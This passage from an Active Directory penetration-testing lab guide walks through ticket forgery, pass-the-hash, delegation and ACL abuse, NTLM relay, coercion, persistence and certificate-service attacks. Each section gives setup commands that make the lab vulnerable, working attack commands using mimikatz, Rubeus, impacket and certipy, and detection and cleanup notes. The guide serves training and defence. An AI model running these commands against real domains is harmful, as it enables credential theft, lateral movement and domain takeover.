secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10 -just-dc-user 'WS01$'
```

### Attack Methods

```powershell
# Silver Ticket for CIFS (file shares)
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /target:ws01.akatsuki.local /service:cifs /rc4:MACHINE_HASH /ptt

# Common services: cifs, http, mssql, wsman, ldap, host
```

### Blue Team: Detection

- No Event 4769 on DC (forged locally)
- Look at service access logs
- PAC validation anomalies

---

## 3.5 Diamond Ticket

### Concept

Diamond Ticket modifies a **legitimate TGT** rather than forging a new one. More stealthy because it uses real ticket structures.

### Attack Methods

```powershell
Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:lowprivuser /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

### Detection

Harder than Golden Ticket - look for:
- Tickets with modified PAC
- User behavior anomalies

---

# 4. Lateral Movement

## 4.1 Pass-the-Hash (PtH)

### Concept

NTLM authentication uses a challenge-response with the hash, not the password. If you have the hash, you can authenticate.

```
Client                          Server
   │                              │
   │──── 1. Request access ──────>│
   │<─── 2. Challenge (random) ───│
   │──── 3. Hash(Challenge) ─────>│  ← Only needs hash!
```

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| NTLM design | Password never sent, only hash response |
| Hash = password | Knowing hash = knowing password for auth |
| Same hash | Same password = same hash everywhere |

### Lab Setup: Make It Possible

**Step 1: Get a hash**

```powershell
# Option 1: LSASS dump (see section 2.1)
# Option 2: SAM dump (see section 2.2)
# Option 3: DCSync (see section 2.3)

# For testing, dump itachi's hash from DC:
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10 -just-dc-user itachi
```

**Step 2: Ensure NTLM is enabled (default)**

```powershell
# NTLM is typically enabled by default
# To verify on target:
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel"
# Values: 0-2 = NTLM enabled, 5 = NTLMv2 only (still works)
```

### Attack Methods

**Method 1: Impacket**
```bash
# psexec (creates service, noisy)
psexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11

# wmiexec (uses WMI, stealthier)
wmiexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11

# smbexec (uses SMB)
smbexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11

# atexec (uses Task Scheduler)
atexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11 "whoami"
```

**Method 2: Mimikatz**
```powershell
# Spawn new process with hash
mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:HASH /run:cmd.exe
```

**Method 3: CrackMapExec**
```bash
# Execute commands
crackmapexec smb 192.168.56.11 -u itachi -H HASH -x "whoami"

# Spray against multiple hosts
crackmapexec smb targets.txt -u itachi -H HASH
```

**Method 4: Evil-WinRM**
```bash
evil-winrm -i 192.168.56.11 -u itachi -H HASH
```

### Blue Team: Detection

| Detection | Event IDs |
|-----------|-----------|
| NTLM logon | 4624 with Logon Type 3, NtLmSsp |
| Service creation | 4697 (psexec) |
| WMI activity | 4688 + wmiprvse.exe |
| Unusual admin activity | Logons from unexpected sources |

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Disable NTLM | Where possible, force Kerberos |
| Credential Guard | Protects hashes in memory |
| LAPS | Unique local admin passwords |
| Protected Users | Prevents NTLM for members |
| Admin tiering | Separate admin accounts per tier |

---

## 4.2 Pass-the-Ticket (PtT)

### Concept

Use stolen Kerberos tickets directly instead of hashes. Tickets prove identity without needing the password.

### Lab Setup: Get a Ticket

```powershell
# Export tickets from memory (requires admin on machine where user is logged in)
mimikatz # sekurlsa::tickets /export

# Or request tickets with Rubeus
Rubeus.exe dump /service:krbtgt /nowrap
```

### Attack Methods

```powershell
# Import ticket (Mimikatz)
mimikatz # kerberos::ptt ticket.kirbi

# Import ticket (Rubeus)
Rubeus.exe ptt /ticket:base64_ticket

# Verify
klist
```

---

## 4.3 Overpass-the-Hash

### Concept

Use an NTLM hash to request a Kerberos ticket. Combines PtH + Kerberos.

### Attack Methods

```powershell
# Mimikatz - spawn process with Kerberos auth
mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:HASH /run:powershell.exe

# Rubeus - request TGT
Rubeus.exe asktgt /user:itachi /rc4:HASH /ptt
Rubeus.exe asktgt /user:itachi /aes256:AESHASH /ptt   # Stealthier
```

---

## 4.4 Remote Execution Methods

### Comparison Table

| Method | Port | Detection | Stealth | Notes |
|--------|------|-----------|---------|-------|
| **PsExec** | 445 | High (service creation) | Low | Creates/deletes service |
| **WMI** | 135 | Medium | Medium | Uses WMI provider |
| **WinRM** | 5985/5986 | Medium | Medium | PowerShell remoting |
| **DCOM** | 135 | Low | High | Abuses COM objects |
| **SMB** | 445 | Medium | Medium | Direct file copy + execution |
| **SSH** | 22 | Low | High | If OpenSSH installed |
| **RDP** | 3389 | Low | Medium | Interactive session |

### Examples

```bash
# DCOM
dcomexec.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11

# WinRM
evil-winrm -i 192.168.56.11 -u itachi -p 'Akatsuki123!'
```

```powershell
# PowerShell Remoting
Enter-PSSession -ComputerName WS01 -Credential (Get-Credential)
```

---

# 5. Delegation Attacks

## 5.1 Unconstrained Delegation

### Concept

When a server has Unconstrained Delegation, it caches the TGT of any user who connects. The server can impersonate that user to ANY service.

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| TGT forwarding | User's TGT sent to server |
| Caching | Server stores TGTs in memory |
| No restrictions | Can use TGT for any service |

### Lab Setup: Make It Vulnerable

```powershell
# Run on DC as Domain Admin

# Enable Unconstrained Delegation on WS01
Set-ADComputer -Identity "WS01" -TrustedForDelegation $true

# Verify
Get-ADComputer WS01 -Properties TrustedForDelegation

Write-Host "WS01 now has Unconstrained Delegation - TGTs will be cached" -ForegroundColor Yellow
```

### Attack Methods

**Step 1: Find unconstrained delegation machines**
```powershell
# PowerView
Get-DomainComputer -Unconstrained

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
```

**Step 2: Compromise the machine and extract TGTs**
```powershell
# On WS01 (requires local admin)
mimikatz # sekurlsa::tickets /export
```

**Step 3: Force high-value target to connect (Coercion)**
```bash
# PrinterBug - forces DC to authenticate to WS01
python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@192.168.56.10 192.168.56.11

# PetitPotam - EFS coercion
python3 PetitPotam.py 192.168.56.11 192.168.56.10
```

**Step 4: Capture and use TGT**
```powershell
mimikatz # kerberos::ptt captured_tgt.kirbi
```

### Blue Team: Detection & Prevention

| Detection | Prevention |
|-----------|------------|
| TGT caching on non-DCs | Remove unconstrained delegation |
| Coercion patterns | Use constrained delegation instead |
| Unusual connections | Add sensitive accounts to "Protected Users" |

### Cleanup: Remove Vulnerability

```powershell
Set-ADComputer -Identity "WS01" -TrustedForDelegation $false
```

---

## 5.2 Constrained Delegation

### Concept

Constrained delegation limits impersonation to specific services listed in `msDS-AllowedToDelegateTo`. However, with the service account hash, you can abuse S4U extensions.

### Lab Setup: Make It Vulnerable

```powershell
# Create service account with constrained delegation

$password = ConvertTo-SecureString "WebServicePass!" -AsPlainText -Force
New-ADUser -Name "svc_web" `
    -SamAccountName "svc_web" `
    -UserPrincipalName "svc_web@akatsuki.local" `
    -Path "OU=Shinobi,DC=akatsuki,DC=local" `
    -AccountPassword $password `
    -Enabled $true `
    -PasswordNeverExpires $true

# Set constrained delegation to CIFS on DC
Set-ADUser -Identity "svc_web" -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.akatsuki.local')}

# Enable trust for delegation
Set-ADAccountControl -Identity "svc_web" -TrustedToAuthForDelegation $true

Write-Host "svc_web can now delegate to CIFS on DC01" -ForegroundColor Yellow
```

### Attack Methods

```powershell
# Find constrained delegation
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo

# Abuse with Rubeus (need svc_web hash)
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /ptt
```

### Cleanup: Remove Vulnerability

```powershell
Remove-ADUser -Identity "svc_web" -Confirm:$false
```

---

## 5.3 Resource-Based Constrained Delegation (RBCD)

### Concept

RBCD flips the trust model - the target resource specifies who can delegate TO it via `msDS-AllowedToActOnBehalfOfOtherIdentity`.

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Write access | Can modify target's RBCD attribute |
| MachineAccountQuota | Domain users can create machine accounts |
| S4U abuse | Use machine account for delegation |

### Lab Setup: Make It Vulnerable

```powershell
# Grant orochimaru write access to WS02's computer object
$ws02 = Get-ADComputer WS02
$acl = Get-Acl "AD:\$($ws02.DistinguishedName)"

$identity = New-Object System.Security.Principal.NTAccount("AKATSUKI\orochimaru")
$rights = [System.DirectoryServices.ActiveDirectoryRights]"GenericWrite"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $rights, $type)
$acl.AddAccessRule($ace)

Set-Acl "AD:\$($ws02.DistinguishedName)" $acl

Write-Host "orochimaru can now write to WS02 computer object - RBCD vulnerable" -ForegroundColor Yellow
```

### Attack Methods

```powershell
# 1. Create a machine account (if MachineAccountQuota > 0)
New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 2. Set RBCD - allow YOURPC to delegate to WS02
Set-ADComputer WS02 -PrincipalsAllowedToDelegateToAccount YOURPC$

# 3. Use S4U to get admin ticket
Rubeus.exe s4u /user:YOURPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/ws02.akatsuki.local /ptt

# 4. Access target
ls \\ws02\c$
```

### Blue Team: Prevention

- Set MachineAccountQuota to 0
- Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes
- Limit GenericWrite permissions

### Cleanup: Remove Vulnerability

```powershell
# Remove orochimaru's write access
$ws02 = Get-ADComputer WS02
$acl = Get-Acl "AD:\$($ws02.DistinguishedName)"
$acl.Access | Where-Object { $_.IdentityReference -match "orochimaru" } | ForEach-Object {
    $acl.RemoveAccessRule($_)
}
Set-Acl "AD:\$($ws02.DistinguishedName)" $acl
```

---

# 6. ACL/Permission Abuse

## Dangerous ACL Rights

| Right | Object | Abuse |
|-------|--------|-------|
| **GenericAll** | User | Reset password, set SPN (Kerberoast) |
| **GenericAll** | Group | Add yourself as member |
| **GenericAll** | Computer | Configure RBCD |
| **GenericWrite** | User | Set SPN, modify logon script |
| **WriteOwner** | Any | Take ownership, then modify DACL |
| **WriteDACL** | Any | Grant yourself any rights |
| **ForceChangePassword** | User | Reset password without knowing old |
| **AddMember** | Group | Add yourself to group |

## Lab Setup: Make It Vulnerable

```powershell
# Grant orochimaru GenericAll on deidara
$user = Get-ADUser deidara
$acl = Get-Acl "AD:\$($user.DistinguishedName)"

$identity = New-Object System.Security.Principal.NTAccount("AKATSUKI\orochimaru")
$rights = [System.DirectoryServices.ActiveDirectoryRights]"GenericAll"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $rights, $type)
$acl.AddAccessRule($ace)

Set-Acl "AD:\$($user.DistinguishedName)" $acl

Write-Host "orochimaru now has GenericAll on deidara - can reset password or set SPN" -ForegroundColor Yellow
```

## Finding Abusable ACLs

```powershell
# PowerView - Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# BloodHound - Best visualization
.\SharpHound.exe -c All
# Import to BloodHound, look at attack paths
```

## Exploitation Examples

```powershell
# GenericAll on User - Reset password
Set-DomainUserPassword -Identity deidara -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# GenericAll on User - Set SPN for Kerberoasting
Set-DomainObject -Identity deidara -Set @{serviceprincipalname='fake/spn'}

# WriteDACL - Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity orochimaru -Rights All

# AddMember on Group
Add-DomainGroupMember -Identity "Domain Admins" -Members orochimaru
```

---

# 7. NTLM Relay Attacks

## Concept

Relay NTLM authentication from a victim to another server to gain access.

```
Victim → Attacker (captures auth) → Relays to Target → Authenticated as Victim
```

## Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| NTLM design | Auth can be relayed in real-time |
| SMB Signing disabled | Allows relaying SMB auth |
| Same credentials | Victim has access to target |

## Lab Setup: Make It Vulnerable

```powershell
# Disable SMB Signing on WS01 (makes it relay target)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 0

Write-Host "SMB Signing disabled on this machine - vulnerable to relay" -ForegroundColor Yellow
# Requires reboot
```

## Attack Methods

```bash
# 1. Check signing requirements
crackmapexec smb 192.168.56.0/24 --gen-relay-list targets.txt

# 2. Start Responder (disable SMB/HTTP)
sudo responder -I eth0 -r -d -w

# 3. Start relay
ntlmrelayx.py -tf targets.txt -smb2support -socks

# 4. Use relayed sessions
proxychains secretsdump.py -no-pass DOMAIN/relayed_user@target
```

## Blue Team: Prevention

- Enable SMB Signing (required on DCs by default)
- Enable EPA (Extended Protection for Authentication)
- Disable NTLM where possible

---

# 8. Coercion Attacks

## Concept

Force a target machine to authenticate to an attacker-controlled server.

## Methods

| Attack | Protocol | Description |
|--------|----------|-------------|
| **PetitPotam** | MS-EFSRPC | Abuses EFS API |
| **PrinterBug** | MS-RPRN | Abuses Print Spooler |
| **DFSCoerce** | MS-DFSNM | Abuses DFS |
| **ShadowCoerce** | MS-FSRVP | Abuses VSS |

## Lab Setup: Print Spooler Running

```powershell
# Verify Print Spooler is running (default on)
Get-Service Spooler

# If not running:
Start-Service Spooler
```

## Attack Methods

```bash
# PetitPotam (no auth needed on older systems)
python3 PetitPotam.py LISTENER_IP DC01

# PrinterBug (requires auth)
python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@DC01 LISTENER_IP

# Coercer (tries everything)
coercer -u orochimaru -p 'Snake2024!' -d akatsuki.local -t DC01 -l LISTENER_IP
```

---

# 9. Persistence Techniques

## AdminSDHolder

Protected groups have ACLs overwritten by AdminSDHolder every 60 minutes. Add yourself = persistence.

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=akatsuki,DC=local" -PrincipalIdentity orochimaru -Rights All
# Wait 60 minutes - now have GenericAll on all protected groups
```

## SID History

Add Domain Admin SID to your SID history.

```powershell
mimikatz # sid::add /sam:orochimaru /new:S-1-5-21-XXXXX-512
```

## Skeleton Key

Patch LSASS on DC to accept master password.

```powershell
mimikatz # misc::skeleton
# Now "mimikatz" works as password for any account
```

## DCShadow

Register a rogue DC to push malicious changes.

```powershell
# Terminal 1 - Push changes
mimikatz # lsadump::dcshadow /object:targetuser /attribute:description /value:"pwned"

# Terminal 2 - Execute
mimikatz # lsadump::dcshadow /push
```

---

# 10. ADCS Attacks

## Concept

Misconfigured certificate templates can lead to domain takeover.

## Common Vulnerabilities

| ESC | Name | Issue |
|-----|------|-------|
| ESC1 | Enrollee Supplies Subject | User can specify arbitrary SAN |
| ESC2 | Any Purpose EKU | Certificate can be used for any purpose |
| ESC3 | Enrollment Agent | Can request certs on behalf of others |
| ESC4 | Template ACL | Users can modify template |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | CA flag allows arbitrary SANs |
| ESC7 | CA ACL | Users have dangerous CA permissions |
| ESC8 | NTLM Relay to ADCS | Relay to HTTP enrollment endpoint |

## Lab Setup: Install ADCS

```powershell
# On DC - Install Certificate Services
Install-WindowsFeature ADCS-Cert-Authority -IncludeManagementTools

# Configure as Enterprise CA
Install-AdcsCertificationAuthority -CAType EnterpriseRootCa -Force
```

## Lab Setup: Make ESC1 Vulnerable

```powershell
# After ADCS is installed, create vulnerable template
# (This is a complex setup - use certipy to find vulnerable templates)
```

## Attack Methods

```bash
# Find vulnerable templates
certipy find -u orochimaru@akatsuki.local -p 'Snake2024!' -dc-ip 192.168.56.10

# ESC1 - Request cert as Administrator
certipy req -u orochimaru@akatsuki.local -p 'Snake2024!' -ca AKATSUKI-DC01-CA -template VulnTemplate -upn administrator@akatsuki.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
```

## Blue Team: Prevention

- Audit certificate templates
- Remove "Enrollee Supplies Subject"
- Require manager approval
- Use strong template ACLs

---

# Tool Reference

| Tool | Purpose | Platform |
|------|---------|----------|
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential extraction | Windows |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos attacks | Windows |
| [Impacket](https://github.com/fortra/impacket) | Network protocols | Python |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Attack path mapping | Cross-platform |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit) | AD enumeration | PowerShell |
| [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) | Swiss army knife | Python |
| [Certipy](https://github.com/ly4k/Certipy) | ADCS attacks | Python |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | WinRM shell | Ruby |
| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBNS poison | Python |
| [Coercer](https://github.com/p0dalirius/Coercer) | Coercion attacks | Python |
| [Kerbrute](https://github.com/ropnop/kerbrute) | Kerberos brute/spray | Go |

---

# Quick Reference: Lab Vulnerability Setup

| Attack | Setup Command |
|--------|--------------|
| Password Spray | Pre-configured (pain & kisame share password) |
| Kerberoasting | `Set-ADUser svc_sql -ServicePrincipalNames @{Add="MSSQLSvc/dc01:1433"}` |
| AS-REP Roast | `Set-ADAccountControl sasori -DoesNotRequirePreAuth $true` |
| DCSync (low priv) | Grant replication rights to user |
| LSASS Dump | RDP as itachi to cache creds; optionally enable WDigest |
| Unconstrained Delegation | `Set-ADComputer WS01 -TrustedForDelegation $true` |
| RBCD | Grant GenericWrite on computer object |
| ACL Abuse | Grant GenericAll/WriteDACL on object |
| NTLM Relay | Disable SMB Signing on target |

---

# References

- [HackTricks - Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [The Hacker Recipes](https://www.thehacker.recipes/)
- [ired.team](https://www.ired.team/)
- [SpecterOps Blog](https://posts.specterops.io/)
- [Orange Cyberdefense AD Mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/)
- [Microsoft AD Security Best Practices](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)
